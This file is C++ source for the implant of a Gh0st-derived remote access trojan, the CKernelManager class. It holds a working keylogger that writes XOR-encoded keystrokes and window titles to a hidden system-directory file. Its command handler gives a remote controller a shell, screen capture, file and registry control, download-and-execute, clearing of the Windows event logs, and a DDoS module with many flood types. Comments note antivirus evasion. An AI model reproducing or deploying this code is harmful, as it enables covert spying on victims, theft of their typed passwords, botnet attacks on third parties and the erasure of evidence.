// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "KernelManager.h"
#include "SystemManager.h"
#include "loop.h"
#include "until.h"
#include "install.h"
#include <Tlhelp32.h>
#include "ddos.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;

HINSTANCE	CKernelManager::g_hInstance = NULL;
DWORD		CKernelManager::m_dwLastMsgTime = GetTickCount();

///////////////////////////////////////////////////////////////////// key log
TCHAR KeyBuffer[2048]; 
void SaveToFile(TCHAR *lpBuffer)
{
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, _T("\\MODIf.html"));
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
	NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	if (dwSize < 1024 * 1024 * 50)
		SetFilePointer(hFile, 0, 0, FILE_END);
	// 加密
	int	nLength = lstrlen(lpBuffer);
	TCHAR*	lpEncodeBuffer = new TCHAR[nLength];
	for (int i = 0; i < nLength; i++)
	lpEncodeBuffer[i] = lpBuffer[i] ^ _T('`');
	WriteFile(hFile, lpEncodeBuffer, lstrlen(lpBuffer)*sizeof(TCHAR), &dwBytesWrite, NULL);
	CloseHandle(hFile);	
	return ;
}
TCHAR *LowerCase[]={
_T("b"),
_T("e"),
_T("[ESC]"),
_T("[F1]"),
_T("[F2]"),
_T("[F3]"),
_T("[F4]"),
_T("[F5]"),
_T("[F6]"),
_T("[F7]"),
_T("[F8]"),
_T("[F9]"),
_T("[F10]"),
_T("[F11]"),
_T("[F12]"),
_T("`"),
_T("1"),
_T("2"),
_T("3"),
_T("4"),
_T("5"),
_T("6"),
_T("7"),
_T("8"),
_T("9"),
_T("0"),
_T("-"),
_T("="),
_T("[TAB]"),
_T("q"),
_T("w"),
_T("e"),
_T("r"),
_T("t"),
_T("y"),
_T("u"),
_T("i"),
_T("o"),
_T("p"),
_T("["),
_T("]"),
_T("a"),
_T("s"),
_T("d"),
_T("f"),
_T("g"),
_T("h"),
_T("j"),
_T("k"),
_T("l"),
_T(";"),
_T("'"),
_T("z"),
_T("x"),
_T("c"),
_T("v"),
_T("b"),
_T("n"),
_T("m"),
_T(","),
_T("."),
_T("/"),
_T("\\"),
_T("[CTRL]"),
_T("[WIN]"),
_T(" "),
_T("[WIN]"),
_T("[Print Screen]"),
_T("[Scroll Lock]"),
_T("[Insert]"),
_T("[Home]"),
_T("[PageUp]"),
_T("[Del]"),
_T("[End]"),
_T("[PageDown]"),
_T("[Left]"),
_T("[UP]"),
_T("[Right]"),
_T("[Down]"),
_T("[Num Lock]"),
_T("/"),
_T("*"),
_T("-"),
_T("+"),
_T("0"),
_T("1"),
_T("2"),
_T("3"),
_T("4"),
_T("5"),
_T("6"),
_T("7"),
_T("8"),
_T("9"),
_T("."),
};

TCHAR *UpperCase[]={
_T("b"),
_T("e"),
_T("[ESC]"),
_T("[F1]"),
_T("[F2]"),
_T("[F3]"),
_T("[F4]"),
_T("[F5]"),
_T("[F6]"),
_T("[F7]"),
_T("[F8]"),
_T("[F9]"),
_T("[F10]"),
_T("[F11]"),
_T("[F12]"),
_T("~"),
_T("!"),
_T("@"),
_T("#"),
_T("$"),
_T("%"),
_T("^"),
_T("&"),
_T("*"),
_T("("),
_T(")"),
_T("_"),
_T("+"),
_T("[TAB]"),
_T("Q"),
_T("W"),
_T("E"),
_T("R"),
_T("T"),
_T("Y"),
_T("U"),
_T("I"),
_T("O"),
_T("P"),
_T("{"),
_T("}"),
_T("A"),
_T("S"),
_T("D"),
_T("F"),
_T("G"),
_T("H"),
_T("J"),
_T("K"),
_T("L"),
_T(":"),
_T("\""),
_T("Z"),
_T("X"),
_T("C"),
_T("V"),
_T("B"),
_T("N"),
_T("M"),
_T("<"),
_T(">"),
_T(".?"),
_T("|"),
_T("[CTRL]"),
_T("[WIN]"),
_T(" "),
_T("[WIN]"),
_T("[Print Screen]"),
_T("[Scroll Lock]"),
_T("[Insert]"),
_T("[Home]"),
_T("[PageUp]"),
_T("[Del]"),
_T("[End]"),
_T("[PageDown]"),
_T("[Left]"),
_T("[Up]"),
_T("[Right]"),
_T("[Down]"),
_T("[Num Lock]"),
_T("/"),
_T("*"),
_T("-"),
_T("+"),
_T("0"),
_T("1"),
_T("2"),
_T("3"),
_T("4"),
_T("5"),
_T("6"),
_T("7"),
_T("8"),
_T("9"),
_T("."),
};

int SpecialKeys[]={
8,
13,
27,
112,
113,
114,
115,
116,
117,
118,
119,
120,
121,
122,
123,
192,
49,
50,
51,
52,
53,
54,
55,
56,
57,
48,
189,
187,
9,
81,
87,
69,
82,
84,
89,
85,
73,
79,
80,
219,
221,
65,
83,
68,
70,
71,
72,
74,
75,
76,
186,
222,
90,
88,
67,
86,
66,
78,
77,
188,
190,
191,
220,
17,
91,
32,
92,
44,
145,
45,
36,
33,
46,
35,
34,
37,
38,
39,
40,
144,
111,
106,
109,
107,
96,
97,
98,
99,
100,
101,
102,
103,
104,
105,
110,
};

HWND PreviousFocus=NULL;
TCHAR WindowCaption[1024]={0};
BOOL IsWindowsFocusChange()
{
	HWND hFocus = GetForegroundWindow(); 
	BOOL ReturnFlag = FALSE; 
	TCHAR temp[1024]={0};
	TCHAR	szText[255]={0};
	if (hFocus != PreviousFocus) 
	{
		if (lstrlen(WindowCaption) > 0)
		{
			if (lstrlen(KeyBuffer) > 0) 
			{
				SYSTEMTIME   s; 
				GetLocalTime(&s);
				wsprintf(temp,_T("\r\n[标题:] %s\r\n[时间:]%d-%d-%d  %d:%d:%d\r\n"),WindowCaption,s.wYear,s.wMonth,s.wDay,s.wHour,s.wMinute,s.wSecond);
				SaveToFile(temp);
			}
			memset(temp,0,sizeof(temp));
			memset(WindowCaption,0,sizeof(WindowCaption));
			ReturnFlag=TRUE; 
		}
		PreviousFocus = hFocus;
		GetWindowText(hFocus,WindowCaption,sizeof(WindowCaption)); 
	}
	return ReturnFlag; 
}

DWORD WINAPI KeyLogger(LPVOID lparam)
{
	int bKstate[256] = {0}; 
	int i,x;
	int state; 
	int shift; 
	memset(KeyBuffer,0,sizeof(KeyBuffer));

	while(TRUE)
	{
		Sleep(8); 
		if (IsWindowsFocusChange())
		{
			if (lstrlen(KeyBuffer) != 0) 
			{
				lstrcat(KeyBuffer,_T("\r\n"));
				SaveToFile(_T("[内容:]"));
				SaveToFile(KeyBuffer);
				memset(KeyBuffer,0,sizeof(KeyBuffer));
			}
		}

		for(i=0;i<92;i++) 
		{
			shift = GetKeyState(VK_SHIFT); 
			x = SpecialKeys[ i ]; 
			if (GetAsyncKeyState(x) & 0x8000) 
			{
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91))) //Caps Lock And Shift Is Not Pressed
				{
					bKstate[x] = 1; 
				}else
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91))) //Caps Lock And Shift Is Pressed
				{
					bKstate[x] = 2; 
				}else
				if (shift < 0) 
				{
					bKstate[x] = 3; 
				}else
				bKstate[x] = 4; 
			}else
			{
				if (bKstate[x] != 0) 
				{
					state = bKstate[x]; 
					bKstate[x] = 0;
					if (x == 8) 
					{
						KeyBuffer[lstrlen(KeyBuffer) - 1] = 0;
						continue;
					}else
					if (lstrlen(KeyBuffer) > 2000) 
					{
						SaveToFile(KeyBuffer);
						memset(KeyBuffer,0,sizeof(KeyBuffer)); 
						continue;
					}else
					if (x == 13) 
					{
						if (lstrlen(KeyBuffer) == 0) 
						{
							continue; 
						}
						lstrcat(KeyBuffer,_T("<Enter>\r\n"));
						continue; 
					}else
					if ((state%2) == 1) 
					{
						lstrcat(KeyBuffer,(TCHAR *)UpperCase[ i ]);
					}else
					if ((state%2) == 0) 
					{
						lstrcat(KeyBuffer,(TCHAR *)LowerCase[ i ]); 
					}
				}
			}
		}
	}
	return 0; 
}

CKernelManager::CKernelManager(CClientSocket *pClient,LPCTSTR lpszKillEvent, LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表示激活
	m_bIsActived = false;
}

CKernelManager::CKernelManager(CClientSocket *pClient):CManager(pClient)
{
	m_nThreadCount = 0;
}

void CKernelManager::StartUnLineHook()
{	
	m_hThread[m_nThreadCount++] = 
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
}

void CKernelManager::init(CClientSocket *pClient,LPCTSTR lpszKillEvent, LPCTSTR lpszMasterHost, UINT nMasterPort)
{
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表示激活
	m_bIsActived = false;
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

BOOL SendMSG(SOCKET ss)
{
	if (send(ss,"OK",2,0) == SOCKET_ERROR)
		if(WSAGetLastError()!=WSAEWOULDBLOCK)
		{
			closesocket(ss);
			return 0;
		}
	return 1;
}

BOOL proc_tag = false;
TCHAR temp_proc[1024]={0};

BOOL isProcesin(LPTSTR lpProcess)
{
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
    info->dwSize=sizeof(PROCESSENTRY32);
	if(Process32First(handle,info))
	{
		if(GetLastError()==ERROR_NO_MORE_FILES )
		{
			return false;
		}
		else{		
			if (strstr(strupr(info->szExeFile),strupr(lpProcess)) > 0) //过NOD32而注释 杀strupr
			{
				return true;
			}
			while(Process32Next(handle,info)!=FALSE)
			{
				if (strstr(strupr(info->szExeFile),strupr(lpProcess)) > 0) //过NOD32而注释 杀strupr
				{
					return true;
				}
			}
		}
	}
	return false;
	CloseHandle(handle);
}

BOOL CALLBACK EnumWindowsList(HWND hwnd, LPARAM lParam)
{
	TCHAR szClassName[254]={0};
	GetWindowText(hwnd,szClassName,254);
	if (strstr(szClassName,temp_proc) != NULL)
	{
		proc_tag = true;
	}
	return true;
}

// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_DLLMAIN:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DLL,
			(lpBuffer + 1), 0, NULL);
		break;
	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_REGEDIT://注册表管理   
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SORT_PROCESS: // 进程筛选
		try
		{
			if (isProcesin((LPTSTR)(lpBuffer + 1)))
			{
				BYTE bToken = TOKEN_INFO_YES;
				m_pClient->Send(&bToken, 1);
			}
			else
			{
				BYTE bToken = TOKEN_INFO_NO;
				m_pClient->Send(&bToken, 1);
			}
		}catch(...){}
		break;
	case COMMAND_SORT_WINDOW: // 窗体筛选
		try
		{
			strcpy(temp_proc,(LPTSTR)(lpBuffer + 1));
			EnumWindows(EnumWindowsList,0);
			if (proc_tag)
			{
				BYTE bToken = TOKEN_INFO_YES;
				m_pClient->Send(&bToken, 1);
				proc_tag = false;
			}
			else
			{
				BYTE bToken = TOKEN_INFO_NO;
				m_pClient->Send(&bToken, 1);
			}
		}catch(...){}
		break;
	case COMMAND_DDOS_ATTACK:
		{
			DATTACK m_Attack;
			memset(&m_Attack,0,sizeof(DATTACK));
			memcpy(&m_Attack,lpBuffer+1,sizeof(DATTACK));
			
//  			OutputDebugString("开始攻击");
//  			puts("开始攻击");
// 			OutputDebugString(m_Attack.Target);
// 			puts(m_Attack.Target);
// 			char	strTMP[MAX_PATH];
// 			wsprintf(strTMP, "Type: %d",m_Attack.AttackType);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
// 			wsprintf(strTMP, "Port:%d",m_Attack.AttackPort);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
// 			wsprintf(strTMP, "Time:%d",m_Attack.AttackTime);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
// 			wsprintf(strTMP, "Thread:%d",m_Attack.AttackThread);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
			
			if(m_Attack.AttackType==1)		//UDP Flood		1	Gh0st版DK
			{
				UDP_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==2)		//SYN Flood		2	暴风7.0
			{
				SYN_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==3)		//ICMP洪水		3	NB5.4代码
			{
				ICMP_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==4)		//TCP Connect	4	NB5.4代码
			{
				TCP_CONNECT(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==5)		//传奇私服攻击	5	NB5.4代码
			{
				SF_SF(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==6)		//ACK流量		6	暴风7.0
			{
				ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==7)		//伪造源UDP(流量)	UDP		7	暴风7.0
			{
				WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==8)		//智能攻击		SYN		8	暴风7.0
			{
				OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息  //操作系统信息
				OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
				GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型

				if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 0 )
				{
//					pszOS = _T("2000");
					ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}else
				if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1 )
				{
//					pszOS = _T("XP");
					WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}else
				if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 2 )
				{
// 					pszOS = _T("2003");
					ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}else
				if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 0 )
				{
					if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
//						pszOS = _T("Vista"); 
						WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
					else
					{
//						pszOS = _T("2008");
						ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
				}else
				if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 1 )
				{
					if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
//						pszOS = _T("7");
						WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
					else
					{
//						pszOS = _T("2008R2");
						ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
				}else
				if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 2 )
				{
					if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
//						pszOS = _T("8");
						WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
					else
					{
//						pszOS = _T("2012");
						ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
				}else
				{
					UDP_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}
			}
			if(m_Attack.AttackType==9)		//无限CC测试	9	DK代码
			{
				CC_SINCON(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==10)		//HTTP Get协议	10	DK代码
			{
				RST_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==11)		//分布式循环CC	11	DK代码
			{
				LX_CC(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread,m_Attack.ExtendData1,m_Attack.ExtendData2);
			}
			if(m_Attack.AttackType==12)		//破防CC	12	暴风7.0
			{
				Break_CC(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==13)		//DNS攻击
			{
				DNS_ATT(m_Attack.Target,m_Attack.DNSTarget,m_Attack.AttackTime);
			}
			if(SendMSG(m_pClient->m_Socket)==0)
				return;
		}
		break;
	case COMMAND_DDOS_STOP:
		{
//  			OutputDebugString("停止攻击");
// 			puts("停止攻击");
			StopDDOS();
			if(SendMSG(m_pClient->m_Socket)==0)
				return;
		}
		break;
	case COMMAND_SHELL: // 远程终端
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: // 键盘记录 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSINFO: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SysInfoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_DOWN_EXEC: // 下载者
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // 传递参数用
		break;
	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // 卸载,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // 清除日志
		CleanEvent();
		break;
	case COMMAND_CLEAN_System: // 清除系统日志
		CleanSystem();
		break;
	case COMMAND_CLEAN_Security: // 清除安全日志
		CleanSecurity();
		break;
	case COMMAND_CLEAN_Application: // 清除程序日志
		CleanApplication();
		break;
	case COMMAND_SESSION:
		CSystemManager::ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_UPDATE_SERVER: // 更新服务端
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_RENAME_REMARK: // 改备注
		SetHostID((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP: // 改分组
		{
			char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
			if (szGetGroup == NULL)
			{
				return;
			}
			SetInfo(szGetGroup, (LPCTSTR)(lpBuffer + 1), "BITS");
		}
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
		break;
	}	
}

extern char* MyDecode(char *str);
void CKernelManager::UnInstallService()
{
	char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
	if (szGetGroup == NULL)
	{
		return;
	}

	char	*szGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "CDEF");
	if (szGroup == NULL)
	{
		return;
	}
	szGroup = (char *)(MyDecode(szGroup + 4));  //解密被加密的字符串
	
	char	strAudioListen[MAX_PATH];
	char	strWebCam[MAX_PATH];
	
	GetWindowsDirectory( strAudioListen, sizeof(strAudioListen) );
	lstrcat( strAudioListen, "\\BAudioListen.dll" );
	DeleteFile(strAudioListen);
	
	GetWindowsDirectory( strWebCam, sizeof(strWebCam) );
	lstrcat( strWebCam, "\\BWebCam.dll" );
	DeleteFile(strWebCam);
		
	//删除离线记录文件
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, _T("\\MODIf.html"));
	DeleteFile(strRecordFile);
	
	char	*szInstall = (char *)FindConfigString(CKernelManager::g_hInstance, "OPQR");
	if (szInstall == NULL)
	{
		return;
	}

	char	*szGreen = (char *)FindConfigString(CKernelManager::g_hInstance, "STUV");
	if (szGreen == NULL)
	{
		return;
	}
	
	if(strstr(szGreen, "K") != NULL)//如果不是绿色安装
	{
		if (strstr(szInstall, "U") != NULL)
		{
			TCHAR   szPath[MAX_PATH];
			SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE);
			TCHAR buf3[MAX_PATH];
			char FileName[80];
			wsprintf(FileName,"%s.exe",szGetGroup);
			wsprintf(buf3, "%s\\%s", szPath, FileName);
			
			char	strTmpPathQ[MAX_PATH];
			char	strRandomFileQ[MAX_PATH];
			GetTempPath(sizeof(strTmpPathQ), strTmpPathQ);
			wsprintf(strRandomFileQ, "%s\\%x.sg", strTmpPathQ, GetTickCount()+57);
			MoveFile(buf3, strRandomFileQ);
			MoveFileEx(strRandomFileQ, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
		}
		if (strstr(szInstall, "I") != NULL)
		{
			char	*SerName = (char *)FindConfigString(CKernelManager::g_hInstance, "EFGH");
			if (SerName == NULL)
			{
				return;
			}
			SerName = (char *)(MyDecode(SerName + 4));  //解密被加密的字符串
			//删除服务
			char	*ServerA = NULL;
			ServerA = SerName;
			SC_HANDLE service, scm;
			scm = OpenSCManager(0, 0,SC_MANAGER_CREATE_SERVICE);
			service = OpenService(scm, ServerA,SERVICE_ALL_ACCESS | DELETE);
			DeleteService(service);
		}
	}

	CHAR	strServiceDll[MAX_PATH];
	GetModuleFileName(NULL, strServiceDll, sizeof(strServiceDll));
	char	strTmpPath[MAX_PATH];
	char	strRandomFile[MAX_PATH];
	GetTempPath(sizeof(strTmpPath), strTmpPath);
	wsprintf(strRandomFile, "%s\\%x.log", strTmpPath, GetTickCount()+357);
	MoveFile(strServiceDll, strRandomFile);
	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	DelSetInfo(szGetGroup, szGroup, "BITS");//写分组信息
	CreateEvent(NULL, true, false, m_strKillEvent);
	exit(0);
	ExitProcess(0);
}

bool CKernelManager::IsActived()
{
	return	m_bIsActived;	
}